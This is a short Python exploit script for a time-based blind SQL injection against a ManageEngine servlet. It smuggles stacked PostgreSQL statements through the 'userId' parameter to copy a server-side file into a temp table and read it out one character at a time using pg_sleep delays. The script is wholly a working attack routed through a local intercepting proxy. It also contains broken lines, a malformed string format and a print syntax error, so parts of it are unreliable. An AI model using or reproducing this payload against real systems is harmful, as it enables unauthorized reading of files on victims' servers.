import sys
import requests
import urllib3
	
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 
'https': 'http://127.0.0.1:8080'}

	#payload for time based blind injection in manageengine

def extract_file(url, max_length=100):
	extracted = ""
	for i in range(1,max_length):
		for j in range(32,126):
			sql_payload = ";" %(i,j)
			params = {
			'ForMasRange':'1',
			'userId' : '1;create temp table cookie (content+text);copy cookie from $$c:\cookie.txt$$;select case when(ascii(substr((select content from cookie),%s,1))=%s) then pg_sleep(10) end;--+' % (i,j)
			}
			r = requests.get('http://%s:<port_number>/servlet/AMUserResourcesSyncServlet' %url, params=params, proxies=proxies, verify=False)
			if int(r.elapsed.total_seconds()) > 10:
				extracted += chr(j)
				sys.stdout.write('\r' + extracted)
				sys.stdout.flush()
				break

			else:
				sys.stdout.write('\r' + extracted + chr(j))
				sys.stdout.flush()

def main():
	if len(sys.argv) != 2:
		print("Give target url")
		print("Example: %s url" sys.argv[0])
		sys.exit(1)

	url = sys.argv[1]

	extract_file(url)

if __name__ == '__main__':	
	main()
